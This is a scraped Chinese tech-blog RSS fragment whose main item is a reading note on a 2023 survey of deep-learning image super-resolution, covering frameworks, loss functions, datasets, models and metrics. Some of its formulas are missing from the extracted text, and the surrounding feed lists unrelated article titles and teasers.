如果有人问你&amp;#xff1a;“你会把 Redis 用在什么业务场景下&amp;#xff1f;”我想你大概率会说&amp;#xff1a;“我会把它当作缓存使用&amp;#xff0c;因为它把后端数据库中的数据存储在内存中&amp;#xff0c;然后直接从内存中读取数据&amp;#xff0c;响应速度会非常快。”没错&amp;#x…阅读更多...你的电脑能不能安装windows 11，用这个软件检测下就知道了为了应对Windows 11的推出&amp;#xff0c;一款名为WhyNotWin11的创新型诊断软件应运而生。这个强大的工具不仅仅是一个简单的兼容性检测器&amp;#xff0c;它更像是一位细心的数字医生&amp;#xff0c;全方位评估您的计算机是否准备好迎接微软最新操作系统的挑战。 
WhyNotWin11的功能远超…阅读更多...代码复现（五）：GCPANet文章目录 net.py1.class Bottleneck&amp;#xff1a;残差块2.class ResNet&amp;#xff1a;特征提取3.class SRM&amp;#xff1a;SR模块4.class FAM&amp;#xff1a;FIA模块5.class CA&amp;#xff1a;GCF模块6.class SA&amp;#xff1a;HA模块7.class GCPANet&amp;#xff1a;网络架构 train.pytest.py 论文…阅读更多...基于SSM+微信小程序的实验室设备故障报修管理系统2&amp;#x1f449;文末查看项目功能视频演示获取源码sql脚本视频导入教程视频 
1、项目介绍 
基于SSM微信小程序的实验室设备故障报修管理系统2实现了管理员&amp;#xff0c;用户&amp;#xff0c;维修员三个角色。 
管理员功能有 个人中心&amp;#xff0c;用户管理&amp;#xff0c;维修员管理&amp;#…阅读更多...YOLO模型在不同光照条件下的检测性能如何优化？域自适应方法&amp;#xff1a;通过合并多个预训练模型&amp;#xff0c;并结合生成模型来适应新的可视化任务&amp;#xff0c;无需创建额外的数据集。例如&amp;#xff0c;YOLO-in-the-Dark模型就是将预先训练好的模型与生成模型相结合&amp;#xff0c;在不增加数据集的情况下&amp;#xff0c;通过粘合层…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:54:02 +0000</pubDate>
    </item>
    <item>
      <title>【论文阅读】DL-SRIR综述2023</title>
      <link>https://www.ppmy.cn/news/1540427.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维【论文阅读】DL-SRIR综述2023news/2025/10/31 17:54:00/0. 摘要SISR与DL的介绍单图像超分辨率(SISR)是计算机视觉的一个重要研究领域,其目的是从低分辨率(LR)图像中恢复清晰、高分辨率(HR)图像。随着深度学习理论和技术的快速发展,深度学习被引入到图像超分辨率(SR)领域,并在许多领域取得了远远超过传统方法的成果。本文框架本文综述了目前基于深度学习的图像SR算法。首先,详细介绍了SISR的主流框架、损失函数和数据集。然后,使用卷积神经网络(CNN)、生成对抗网络(GAN)和Transformer三种模型探索基于深度学习的SISR算法。其次,介绍了用于SR的评价指标，并比较了基于深度学习的各种算法的重建结果。最后,总结了基于深度学习的图像SR算法的未来研究趋势。关键词：图像超分辨率、深度学习、卷积神经网络、生成式对抗网络、Transformer1. 介绍1.1. 图像超分辨率概述目的是将低分辨率（LR）图像转换为高分辨率（HR）图像，是图像处理和计算机视觉相关的主要技术之一。分为单 LR 图像生成 HR 图像技术（单图像超分辨率技术，SISR）和多 LR 图像生成 HR 图像技术。SISR 因灵活、简单、实用等优点，在图像压缩、医学成像、遥感成像、公安等领域广泛应用。1.2. 传统 SISR 算法的局限性在深度学习算法出现之前，SISR 使用基于插值和基于重建的算法。基于插值的算法简单且运行速度快，但生成图像过于平滑，丢失高频信息，导致振铃效应。基于重建的算法结果优于插值算法，但执行效率较低，对缩放因子敏感。1.3. 深度学习在 SISR 中的优势深度学习方法可学习 LR 和 HR 图像之间的映射关系，通过 SR 图像重建算法实现图像重建，效果优于传统算法。近年来还提出了轻量级网络，允许 SISR 模型使用更少参数获得优异 SR 结果。2. SRIR基础2.1. 算法框架2.1.1. 组成想象你有一个神奇的工具，可以把低分辨率的小图变成高分辨率的大图，这个工具内部的工作方式就像一个有特定规则的工厂，这个工厂的规则就是我们说的超分辨率框架。这个工厂有两个主要的车间，一个是 “非线性映射学习车间”，另一个是 “图像放大上采样车间”。“非线性映射学习车间” 的任务是搞清楚低分辨率图像（LR）怎么才能变成高分辨率图像（HR），就像一个学生在学习知识，它要学习 LR 到 HR 的变化规则。而且在学习过程中，还有一个“小老师”，也就是损失函数，它会告诉这个 “学生” 学得对不对，应该怎么改进。“图像放大上采样车间” 就比较直接啦，它是把前面车间初步处理得到的图像进行放大，就像把一个小的东西放大一样。这两个车间一起合作，就能完成把低分辨率图像变成高分辨率图像的任务啦。2.1.2. 分类根据上采样模块位置不同，SISR 方法分为四个超级评分框架前端上采样 SR 框架首次被采用，可避免在低维空间学习低维到高维映射，降低学习难度。这是最早被研究人员采用的一种布局方式。你可以把它想象成在工厂入口处就先进行放大操作（前端上采样）。这样做有个好处，就是可以让后面学习 LR 到 HR 映射的过程变得简单一些，就像你先把东西放大了，可能更容易看清楚它的一些特征，学习起来难度就降低了。但噪声和模糊会增强，高维空间卷积操作增加计算量和资源消耗。但是呢，也有不好的地方。就像你把一个本来就有点模糊的小图一下子放大很多，它的噪声和模糊会变得更严重。而且在后面学习过程中，因为一开始就放大了，在高维空间里进行一些操作（卷积操作）就会消耗很多计算资源，就像一个很耗电的机器一样。后端上采样 SR 框架将上采样模块置于网络后端，大部分卷积计算在低维空间进行。针对前端上采样框架的问题，研究人员想出了一种新的布局。把放大操作（上采样）放到了工厂的最后面（后端上采样）。这样大部分的计算，比如卷积计算，就可以在低维空间里进行啦（计算量更小），就像在一个小的、更节能的空间里工作。最后使用端到端可学习的应用上采样层，释放卷积计算能力，降低模型复杂度。最后再加上一个专门用来放大的 “小机器”（端到端可学习的应用上采样层），这样既可以节省计算资源，又能把图像放大好，还能让整个工厂（模型）的结构不那么复杂。渐进式上采样 SR 框架随着领域发展和 SR 尺度增大而提出。随着技术发展，对图像放大的要求越来越高，原来的方法不太够了。所以就有了这个新的框架。它就像一个有很多步骤的生产线。图像放大是渐进式的，过程中途生成的图像会继续送入后续模块，直到达到目标分辨率。图像放大不是一下子完成的，而是一步一步来（渐进式）。比如先把图像放大一点点，得到一个中间的图像，然后这个中间图像再送到下一个环节继续放大，就像接力比赛一样，一直到最后达到我们想要的高分辨率。常见方法包括使用卷积级联或拉普拉斯金字塔，结合多层次监督和其他学习策略。在这个过程中，还会用到一些其他的方法，比如卷积级联或者拉普拉斯金字塔这些技术，还会结合多层次监督等学习策略，这样就能更好地完成把图像放大很多倍的任务。逐级上采样 SR 框架扩展反向投影思想，采用交替上采样和下采样的方式。这个框架有点像一个很复杂的机器，它是在原来一些想法的基础上发展来的。它的工作方式是一会儿放大（上采样），一会儿缩小（下采样），反复进行这个过程。通过反复进行映射学习，充分学习 LR 与 HR 之间的映射关系。但结构复杂，设计标准不明确，需进一步探索。通过这样反复地学习图像的变化（映射学习），它可以更好地搞清楚 LR 和 HR 之间的关系。但是呢，这个框架目前还不是很完美，它的结构比较复杂，就像一个很复杂的机器，我们还不太清楚它最好的设计方法，还需要进一步研究。2.2. 损失函数损失函数是深度学习模型基本要素，在 SISR 任务中量化 HR 图像与地面真实 HR 图像的差异，调节模型学习方向。2.2.1. 像素损失这个损失函数使用像素值来测量两个图像之间的差异。均方误差（MSE，也称为 L2 损失）公式：解释：这里的表示训练样本的数量，是重建图像，是原始的高分辨率（ground truth）图像。它是通过计算每个像素点的差值的平方和，然后取平均值来得到损失值。特点：MSE 的函数曲线是光滑的、连续的，可以方便地使用梯度下降算法进行优化。但是它对异常值非常敏感，当图像中存在一些与其他像素值差异较大的像素（异常值）时，MSE 会给这些异常值很高的权重，导致在正常误差范围内的预测效果被牺牲，使得最终重建的图像更加平滑、模糊，缺乏高频纹理细节。函数曲线特性与优化便利性MSE 的函数曲线就像一条很平滑的道路，没有坑坑洼洼的地方。这种平滑和连续的特点让我们在使用一种叫梯度下降的方法来让模型变得更好的时候非常方便。就好比你在一条平坦的路上开车，很容易控制方向和速度，朝着让模型更好的方向前进。对异常值的敏感性及影响但是呢，MSE 有个不太好的地方，就是它对那些和其他像素值不一样的 “特殊像素”（异常值）太敏感啦。比如说，在一幅图像里，大部分像素的值都在一个比较正常的范围内，但是有几个像素的值特别大或者特别小，和其他像素相差很多。MSE 就会觉得这些特殊像素非常重要，给它们很高的 “关注”（权重）。这样一来，模型就会太在意这些特殊像素，而忽略了图像中其他正常像素之间的关系。结果就是，最后重建出来的图像就变得不太好啦。图像会变得很平滑，就像你用手把一幅画的细节都抹掉了一样，而且很模糊，那些本来应该有的清晰的纹理和细节都没有了，整个图像看起来就很平淡。平均绝对误差（MAE，也称为 L1 损失）公式：解释：同样是对重建图像和原始高分辨率图像的像素差值进行计算，不过这里是取绝对值后再求平均值。特点：相比 MSE，它对异常值不太敏感，这是它的一个优势。随着误差的减小，它的梯度也会减小，对各种输入值保持稳定的梯度，避免了梯度爆炸的问题，训练过程相对稳定。但是它存在不可导点，不利于函数的收敛和模型的学习。在实际应用中，L1 损失函数的实际效果要优于 MSE，因为它可以提高模型的性能，获得更高的指标。对异常值的不敏感性及优势L1 损失函数和 MSE 相比，有一个很大的优点，就是它不太在意那些和其他像素值差别很大的 “特殊像素”（异常值）。就好像在一群人中，有几个特别突出的人，L1 不会像 MSE 那样只盯着这几个人看，而是会更全面地考虑所有人的情况。当图像中的误差在逐渐变小的时候，L1 损失函数的变化速度（梯度）也会跟着变小。而且不管输入的图像数据是什么样的，它的这个变化速度都比较稳定，不会像有些函数那样突然变得很大或者很小（避免了梯度爆炸的问题）。这样在训练模型的时候，整个过程就会比较平稳，不会出现大的波动。不可导点的问题及对学习的影响但是 L1 损失函数也有它自己的小毛病，就是它在某些地方是不可导的。这就好比一条路，有些地方是断的，你没办法沿着这条路一直走下去。对于函数来说，这种不可导的地方就会影响它变得更好（收敛），也会让模型在学习的时候遇到困难，不太容易找到最好的参数值，让模型达到最好的效果。实际应用中的效果优势不过在实际使用的时候，我们发现 L1 损失函数还是很有用的。虽然它有不可导点的问题，但是它能够让模型的表现更好，得到更高的指标。这就说明它在提高模型性能方面有它独特的优势，所以在很多情况下，我们还是会选择 L1 损失函数而不是 MSE。Charbonnier 损失（L1 损失的一种改进形式）公式：，其中，是一个非常小的常数，一般取。解释：这种损失函数是为了克服 L1 损失存在不可导点的问题而提出的。通过引入一个带有小常数的函数形式，解决了 L1 损耗的缺点。L1 损失的不可导点问题L1 损失函数在某些地方是不可导的，就像一条路有一些坑坑洼洼或者断的地方，你没办法很顺畅地在上面走（进行数学计算和优化）。这会给我们使用这个函数带来麻烦，因为我们希望函数能够很顺利地找到让模型最好的参数值（收敛），但是不可导点会阻碍这个过程。Charbonnier 损失的解决方法Charbonnier 损失函数就想办法来解决这个问题啦。它在 L1 损失的基础上，引入了一个带有小常数（比如，一般取）的函数形式。这个小常数就像一个 “补丁”，它把 L1 损失函数那些不可导的地方给补上了，让函数变得更加 “完整” 和好用。这样一来，原来 L1 损失函数因为不可导点带来的那些缺点就被解决啦，我们就可以更好地用这个新的函数形式（Charbonnier 损失）来让模型学习，提高模型的性能。2.2.2.内容损失为提高图像感知质量引入，不要求像素级精度，关注人眼感官级相似性。通常使用预训练图像分类网络评估两幅图像语义差异。2.2.3.纹理损失重建图像应与目标图像有相同风格，纹理可视为不同特征通道相关性，用 Gram 矩阵表示。2.2.4.对抗性损失概念来源于 GAN，2017 年引入 SR 领域。SRGAN 中使用对抗性损失，通过生成器和鉴别器的对抗训练提高图像质量。2.2.5.感知损失基于像素的损失函数使图像纹理质量更平滑，视觉不满意。基于感知的损失函数可恢复高频细节，通过测量提取特征之间的距离优化感知损失。在 SRGAN 中，感知函数定义为内容损失和对抗损失的加权和。2.3. 数据集2.3.1. 重要性数据集在单图像超分辨率（SISR）网络中是非常关键的部分。就好比厨师做菜需要优质的食材一样，一个合适的训练数据集对于提高 SISR 网络的性能至关重要。它为网络提供了学习的样本和依据，网络通过对数据集中的图像进行学习，从而掌握从低分辨率（LR）图像到高分辨率（HR）图像的转换规律。2.3.2. 特点大多数 SISR 数据集只包含 HR 图像，不包含不同放大倍数下的 LR - HR 图像对。这就意味着如果我们要使用这些数据集来训练模型，就需要一种方法来构建合适的图像对。通常会使用双三次插值算法来构建 LR - HR 图像对，这样模型就可以学习到 LR 和 HR 图像之间的关系。2.3.3. 常用数据集介绍Set5、Set14、Urban100、BSD100 和 Manga109这五个数据集是最常用的测试集。它们包含了各种各样的图片，比如人物、动物、植物、建筑、食物、自然景观和环境等。这些数据集可以用来测试模型在不同类型图像上的性能。DIV2K它是一个比较流行的 SISR 数据集，包含 1000 张不同场景的图像，这些场景包括人物、手工艺品、环境、景观等。其中 800 张用于训练，100 张用于验证，100 张用于测试。这个数据集的优点是它可以让 SR 的研究基于更真实的退化图像，所以在很多相关的研究工作中都被采用。Flickr2K这是另一个大型的扩展数据集，包含 2650 张 2k 图像，主要是人物、动植物、建筑和风景等内容，用于训练模型。近年来，研究人员经常把 DIV2K 和 Flickr2K 合并起来，形成 DF2K 训练数据集，这样可以进一步提高 SR 网络的性能。RealSR它是第一个真正收集包含 LR 和 HR 配对图像的 SISR 数据集，使用两台不同的数码相机（佳能 5D3 和尼康 D810）拍摄了各种室内和室外场景，共包含 595 对 LR - HR 图像。ImageNet这个数据集近年来也被引入到 SR 领域，不过它主要是用于图像分类的。它包含了超过 1400 万个全尺寸标记图像，涵盖了动物、植物、运输工具、家具、乐器、构造学、工具等各种类别。此外，还有 L20（包含多种场景图像，像素范围从 300 万到 2900 万不等）、户外场景（包含七种纹理图像）、PIRM（包含多种图像）、MSCOCO（包含 91 个用于对象检测等的对象类别）、PIPAL（一个感知图像质量评估数据集）、City100（包含 100 对 HR - LR 图像对）、DPED（由真实照片组成）、T91（包含局部纹理图像）等数据集。这些数据集也都被用于图像 SR 重建，它们大大扩展了可用数据集的数量和类型，这对于测试各种模型的泛化能力是非常有帮助的。3. DL-SRIR算法3.1. CNNCNN 是由多层感知器 (MLP) 发展而来的。由于其结构特征，如局部连接、权值共享和下采样，cnn 在图像处理任务上表现良好。许多学者将 CNN 应用于 SISR，并取得了超过传统方法的结果。根据所使用的 CNN 网络的不同，基于 CNN 的模型一般可以分为以下几种：3.1.1. 卷积直接连接模型SRCNN：Dong 等人于 2014 年率先将 CNN 应用于 SR，提出了超分辨率卷积神经网络 (SRCNN)。该技术在图像 SR 领域取得了突破性进展，与传统方法相比，具有模型简单、精度高、速度快等优点，同时重建质量优于其他方法。然而，其前端上采样模型框架存在计算复杂、训练收敛慢等问题。此外，SRCNN 也存在结构简单、难以充分利用图像上下文信息等缺点。FSRCNN：同年，Dong 等提出了一种快速超分辨率重建卷积神经网络 (FSRCNN) 来解决 SRCNN 固有的问题。与 SRCNN 相比，FSRCNN 取得了一些改进，它在末端使用反卷积层来扩大尺寸，可以直接将原始 LR 图像输入到网络中，并且可以根据 LR 图像的大小计算卷积，从而大大减少了时间消耗。为了降低 SRCNN 中映射层的计算复杂度，通过增加一个收缩层来减少 FSRCNN 中的参数数量。ESPCN：由于 SRCNN 在将 LR 图像输入网络之前需要对其进行上采样以获得 HR 图像，因此需要在更高的分辨率下进行卷积运算，这增加了计算复杂度。为此，Shi 等人于 2016 年提出了高效亚像素卷积神经网络 (ESPCN) 模型。这种方法的核心思想是使用亚像素卷积层而不是反卷积层来实现上采样操作。3.1.2. 残差网络模型VDSR：Kim 等人受到 VGG-Net 的启发，将残差网络应用于图像 SR，并于 2016 年提出了超分辨率 (VDSR) 模型的非常深卷积网络。该网络使用 20 个卷积层，通过在深度网络结构中多次级联小滤波器，有效地利用大图像区域的上下文信息。RED：同年，Mao 等人提出了残差编码器 - 解码器网络 (RED)。这个网络的结构是对称的，每个卷积层都有一个对应的反卷积层。卷积层用于获取图像的抽象内容，而反卷积层用于放大特征尺寸，还原图像的细节。EDSR：2017 年，Lim 等人提出了增强型深度超分辨率网络 (EDSR)，并在 2017 年的 NTIRE2017 超分辨率挑战赛中获得一等奖。其结构创新地从 SRResNet 中删除了批归一化 (BN) 层，由于 BN 层消耗的内存与之前的卷积层相同，删除这一步意味着 EDSR 可以堆叠更多的网络层或从每层提取更多的特征，以获得更好的性能，同时使用相同的计算资源。3.1.3. 循环神经网络模型DRCN：2016 年，Kim 等人将 RNN 应用于图像 SR，提出了深度递归卷积网络 (DRCN)。该网络由嵌入、推理和重建模块组成，对应于 SRCNN 中的特征提取、非线性映射和重建模块。在推理网络中使用了递归层，每次递归都使用相同的卷积核和 ReLU 激活。DRRN：2017 年，Tai 等提出了一种基于 DRCN 的深度递归残差网络 (DRRN)，采用全局和局部残差结构。引入局部残差学习来解决细节丢失导致的图像退化问题，因为它是在堆叠的层之间进行的。SRFBN：2019 年，Li 等人将一种反馈机制引入 RNN 中，以创建图像超分辨率反馈网络 (SRFBN)。通过使用反馈连接，利用高阶信息来细化低阶信息，从而获得更清晰的重建图像。3.1.4. 密集卷积模型SRDenseNet：2017 年，Tong 等首次将 DenseNet 应用于 SR，提出了超分辨率密集网络 (SRDenseNet)。该网络包括一个用于提取低级特征的卷积层，一个用于学习高级特征的 DenseNet 块，一个反卷积层和一个重建模块。通过密集的跳跃连接将低层和高层特征有效融合，然后使用反卷积层进一步增强重建图像的细节，改善信息流，缓解梯度消失的问题。MemNet：同年，Tai 等人提出了深度持久性记忆网络 (MemNet)。其结构与传统神经网络的单向传播结构不同，因为这是一个长期记忆模型。该网络由一个特征提取网络、多个堆叠的记忆块和一个重建网络组成。3.1.5. 注意力机制模型SENet：2018 年，Hu 等人提出了挤压和提取网络 (SENet)，将通道注意机制引入深度神经网络。通道对应于图像的一个特征。SENet 分为两个步骤：挤压和激励。首先，将每个通道的特征压缩为该通道的描述子。然后，通过激励捕获通道之间的关系，并显式建模通道之间的相互依赖关系，以提高网络的特征学习能力。RCAN：2018 年，Zhang 等人首次将注意力机制应用于 SR，开发了剩余通道关注网络 (RCAN)。该网络由四个主要部分组成：浅层特征提取、残差中残差 (RIR) 深度特征提取、上采样模块和重建模块。RIR 模块包括多个残差组和长跳连接，每个残差组还包括多个残差信道注意块和短跳连接。SAN：2019 年，Dai 等人研究了特征的二阶统计量，提出了一种深度二阶注意网络 (SAN)。该网络最值得注意的方面是它基于非局部增强残差群 (NLRG) 和二阶通道注意 (SOCA) 机制。CRAN：2021 年，Zhang 等人提出了上下文推理注意力网络 (CRAN)，它可以根据全局上下文自适应调整卷积核，通过语义推理进行增强。该模型采用 RCAN 的网络结构，只是将网络中原有的 RCAB 替换为 CRAB，其中包含了作者提出的上下文推理注意卷积 (CRAC)。VapSR：2022 年，Zhou 等人提出了一种高效的图像 SR 方法VapSR (VAst receptive field Pixel attention network)。它将大接受野设计引入到注意机制中，通过使用多组对照实验证明引入大核卷积可以提高网络性能，但这涉及大量额外参数，所以使用深度可分离卷积来分割密集的大卷积核，以减少网络参数的数量。然而，由于在注意力机制中使用了逐元素相乘，使得网络的训练变得不稳定，因此作者提出了一种像素归一化方法来对移位的层分布进行归一化，给出标准正态分布。经过一系列操作后，与单独使用大核卷积相比，这个网络模型可以用最少的数量参数实现良好的性能。3.1.6. 轻量级卷积网络模型IDN：2018 年，Zheng 等提出了一种参数轻量、计算复杂度低的信息蒸馏网络 (IDN)。该网络由三部分组成：特征提取块 (FBlocks)、多个堆叠的信息蒸馏块 (DBlocks) 和重构模块 (RBlocks)。信息蒸馏块由增强单元和压缩单元组成，是 IDN 网络的核心结构，可以逐步提取丰富有效的图像特征。IMDN：2019 年，Hui 等人对 IDN 中的信息蒸馏块进行了改进，提出了一种用于构建轻量级信息多蒸馏网络 (IMDN) 的信息多蒸馏块 (IMDB)。该网络架构还涉及到浅层特征提取、通过使用多个堆叠的 IMDBs 进行深层特征提取以及上采样模块。LatticeNet：2020 年，Luo 等人对 SR 中常用的残余块 (RB) 进行了改进，提出了一种晶格块 (LB)。LB 可以将参数数量减少一半左右，同时保持相似的 SR 性能。在此基础上，Luo 等人提出了一种轻量级网络模型，称为 LatticeNet。3.2. GANSRGAN：2017 年，Ledig 等人首次将 GAN 应用于图像 SR 任务，提出了基于 GAN 方法的 SRGAN。该网络使用 GAN 来训练 SRResNet，使用基于 VGG 的内容损失和对抗损失结合起来的感知损失函数，以提高图像的真实性。ESRGAN：2018 年，Wang 等人改进了 SRGAN，提出了增强型 SRGAN (ESRGAN)，没有 SRGAN 的 BN 层，从而降低了计算复杂度，采用残差密集块作为网络的基本单元，对于鉴别器，采用了相对鉴别器的概念。MPDGAN：2019 年，Lee 等人提出了一种基于多视角鉴别器的生成对抗网络 (MPDGAN)，使用各种视角鉴别器来区分真假图像，以减少 SR 伪影和噪声。ESRGAN +：2020 年，Nathanaël 等人在 ESRGAN 的基础上提出了 ESRGAN +，旨在进一步提高 ESRGAN 生成的图像的感知质量，使用了一种新的块，称为残差嵌套稠密残差块 (RRDRB)，还在输出中加入高斯噪声。PGAN：2023 年，Shi 等人提出了一种像素级的生成式对抗训练方法来解决结构畸变问题，针对像素的对抗性训练使用了邻域信息，还提出了一种梯度引导的结构感知深度网络，将提出的网络命名为 PGAN，在所有五个基准数据集上都取得了最先进的性能。3.3. TransformerIPT：2021 年，Chen 等人提出了一种称为图像处理变压器 (image processing transformer, IPT) 的预训练网络模型，用于各种低级计算机视觉任务，如 SR 和去噪。该网络主要由头部用于特征提取，编码器 - 解码器 transformer 用于重建丢失的信息，尾部用于输出重建的图像三部分组成。SwinIR：同年，Liang 等人提出了一种使用 swin 变压器 (SwinIR) 进行图像恢复的图像恢复网络。该网络结合了 CNN 和变压器，包括浅层特征提取、深层特征提取和图像重建三个主要模块，同时具有 CNN 和变压器的优点，在多个方面都达到了最先进的性能。ESRT：2022 年，Lu 等人提出了用于 SISR 任务的轻量级变压器模型 (ESRT)，由轻型 CNN 骨干 (LCB) 和轻型变压器骨干 (LTB) 组成，LTB 中的高效变压器 (ET) 模块是对传统多头注意 (MHA) 的改进，可有效增强图像中相似块的特征表达能力和长期依赖关系。ELAN：2022 年，Zhang 等人提出了一种有效的远程注意力网络 (ELAN)，由浅层特征提取、深层特征提取和 HR 图像重建三部分组成，在所有五个数据集上都取得了良好的指标，且比 SwinIR - light 模型快 4.5 倍，参数更少，计算复杂度更低。4. SRIR质量评价4.1. 评价指标4.1.1. 客观评价峰值信噪比（PSNR）：这个指标主要看生成的超分辨率图像和原始高分辨率图像之间像素值的差异。如果差异小，PSNR 的值就大，说明图像质量好；反之，如果差异大，PSNR 值就小，图像质量差。就好比两个东西越接近，它们之间的 “距离”（这里是像素值差异）就越小，PSNR 就越高。结构相似指数（SSIM）：它是从图像的结构信息角度来衡量相似度的。不仅仅看像素值，还考虑图像的亮度、对比度和结构细节等方面。如果两个图像在这些方面都很相似，SSIM 的值就会接近 1；如果差别很大，值就会接近 0。平均结构相似性（MSSIM）：和 SSIM 类似，也是衡量图像结构相似性的，但它是在对同一图像进行一些处理（低通滤波）后，综合考虑不同分辨率下的结构相似情况。特征相似指数测度（FSIM）：这个指标从两个方面来衡量图像相似度。一方面利用相位一致性提取图像的特征信息，另一方面利用梯度幅值提取对比度信息，然后综合这两方面来看看图像局部有多相似。学习感知图像斑块相似度（LPIPS）：它更侧重于从人的感知角度来衡量图像的相似度。它会让生成器学习如何从假图像中还原出真实图像的一些特征，然后看生成的图像和真实图像在人眼感知上有多相似，值越小越相似。感知指数（PI）：结合了其他两个非参考客观评价指标，用来表示图像的主观感知质量。PI 值越低，说明图像在人眼看来质量越好。4.1.2. 主观评价平均意见得分（MOS）：就像给图像质量打分一样，从 1 分到 5 分，1 分最差，5 分最好。这个分数是让人来评价的，比较主观，但能直接反映人对图像质量的感受。4.2. 重建效果对比此部分从深度学习的三个模型（卷积神经网络 CNN、生成对抗网络 GAN 和 Transformer），在三个不同放大倍数（×2、×3、×4）下，对经典的单图像超分辨率（SISR）算法的重建结果进行比较分析。5. 发展趋势构建轻量级 SISR 模型现状与问题：现有 SISR 网络存在两个局限。一是网络过深，这不仅削弱了自下而上的信息流，还导致模型容量大、计算负担重；二是网络架构常为前馈式，使得前几层难以从后面层捕获有用信息，限制了网络的特征学习能力。目标：设计轻量级神经网络，以获得更高效的网络，优化网络结构和卷积计算，在不损失性能的前提下减少网络参数，加强对内部网络的理解，并缓解在移动设备上实现 SR 的问题。无监督 SR 重建现状与问题：有监督的图像 SR 重建需要 LR - HR 图像对作为数据集，且模型需设计退化模块来处理 HR 图像，但这种退化方法固定单一，与现实中复杂多变的退化类型不符，严重影响图像 SR 的发展和应用价值。目标：实现无监督的 SR 重建，即无需构建 LR - HR 图像对的 SR 重建。这可降低对训练样本的要求，更符合分割的实际需求，但对模型的学习能力提出了更高要求。设计更科学合理的损失函数和评价指标现状与问题：感知损失函数的引入虽能恢复更多高频纹理细节，使图像在人眼中的效果更好，但 RSNR 评价指标值却降低了，这就产生了良好视觉感知和高性能指标之间的矛盾。虽然提出了 MOS 作为评价指标，但该评价过程耗时费力。目标：考虑人类视觉感知系统，提出更符合人类视觉感知的损失函数以及综合考虑人类感知和模型性能的评价方法，以满足用户的实际需求。改进上采样方法现状与问题：当前的上采样方法存在缺乏端到端学习、感受野分布不均和棋盘效应等问题，这些问题会导致 SISR 算法效率低下和重建结果不稳定。而且目前大多数上采样方法基于整数倍数，缺乏通用性。目标：开发一种对任意放大因子都高效且合适的上采样方法，这是未来值得进一步研究的方向。http://www.ppmy.cn/news/1540427.html相关文章《15分钟轻松学Go》教程目录在AI快速发展的时代&amp;#xff0c;学习Go语言依然很有用。Go语言擅长处理高并发任务&amp;#xff0c;也就是说可以同时处理很多请求&amp;#xff0c;这对于需要快速响应的AI服务非常重要。另外&amp;#xff0c;Go适合用来处理和传输大量数据&amp;#xff0c;非常适合机器学习模型的数据预处理。 
…阅读更多...Linux——K8S的pod的调度DeploymentStatefulSetDaemonsetreplicaSetReplicacontroller     // 从K8S的近期版本中将逐渐移除rcJobcronjob 
K8s 网络&amp;#xff1a; 
平台中的POD如何通信&amp;#xff1a; CNI 容器网络插件Coredns的组件 负责提供平台中的名称解析平台中的应用如何被客户端访问 Service // 将…阅读更多...【基础篇】AOF日志：宕机了，Redis如何避免数据丢失？背景 
如果有人问你&amp;#xff1a;“你会把 Redis 用在什么业务场景下&amp;#xff1f;”我想你大概率会说&amp;#xff1a;“我会把它当作缓存使用&amp;#xff0c;因为它把后端数据库中的数据存储在内存中&amp;#xff0c;然后直接从内存中读取数据&amp;#xff0c;响应速度会非常快。”没错&amp;#x…阅读更多...你的电脑能不能安装windows 11，用这个软件检测下就知道了为了应对Windows 11的推出&amp;#xff0c;一款名为WhyNotWin11的创新型诊断软件应运而生。这个强大的工具不仅仅是一个简单的兼容性检测器&amp;#xff0c;它更像是一位细心的数字医生&amp;#xff0c;全方位评估您的计算机是否准备好迎接微软最新操作系统的挑战。 
WhyNotWin11的功能远超…阅读更多...代码复现（五）：GCPANet文章目录 net.py1.class Bottleneck&amp;#xff1a;残差块2.class ResNet&amp;#xff1a;特征提取3.class SRM&amp;#xff1a;SR模块4.class FAM&amp;#xff1a;FIA模块5.class CA&amp;#xff1a;GCF模块6.class SA&amp;#xff1a;HA模块7.class GCPANet&amp;#xff1a;网络架构 train.pytest.py 论文…阅读更多...基于SSM+微信小程序的实验室设备故障报修管理系统2&amp;#x1f449;文末查看项目功能视频演示获取源码sql脚本视频导入教程视频 
1、项目介绍 
基于SSM微信小程序的实验室设备故障报修管理系统2实现了管理员&amp;#xff0c;用户&amp;#xff0c;维修员三个角色。 
管理员功能有 个人中心&amp;#xff0c;用户管理&amp;#xff0c;维修员管理&amp;#…阅读更多...YOLO模型在不同光照条件下的检测性能如何优化？域自适应方法&amp;#xff1a;通过合并多个预训练模型&amp;#xff0c;并结合生成模型来适应新的可视化任务&amp;#xff0c;无需创建额外的数据集。例如&amp;#xff0c;YOLO-in-the-Dark模型就是将预先训练好的模型与生成模型相结合&amp;#xff0c;在不增加数据集的情况下&amp;#xff0c;通过粘合层…阅读更多...QT QML 练习1这个代码是使用 QtQuick 框架编写的一个简单的 GUI 应用程序&amp;#xff0c;创建了一个窗口&amp;#xff0c;其中包含了一个背景图像、一个风车杆&amp;#xff08;pole&amp;#xff09;&amp;#xff0c;以及一个可以点击旋转的风车&amp;#xff08;pinwheel&amp;#xff09;。以下是对实现的详细介绍及其特…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 